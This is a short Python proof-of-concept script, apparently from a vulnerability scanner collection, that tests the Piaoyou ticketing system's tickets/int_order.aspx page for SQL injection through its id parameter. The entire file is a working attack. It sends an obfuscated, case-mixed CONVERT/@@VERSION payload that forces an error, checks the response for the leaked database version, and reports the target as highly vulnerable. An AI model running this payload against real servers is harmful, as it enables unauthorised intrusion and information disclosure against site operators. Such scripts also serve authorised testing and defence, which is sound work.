#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 票友票务系统int_order.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0127911
author: Lucifer
description: 文件tickets/int_order.aspx中,参数id存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class piaoyou_int_order_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/tickets/int_order.aspx?id=1Or/**/1=CoNvErt(InT,ChAr(66)%2BChAr(66)%2BChAr(66)%2b@@VeRsIoN)--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                cprint("[+]存在票友票务系统int_order.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = piaoyou_int_order_sqli_BaseVerify(sys.argv[1])
    testVuln.run()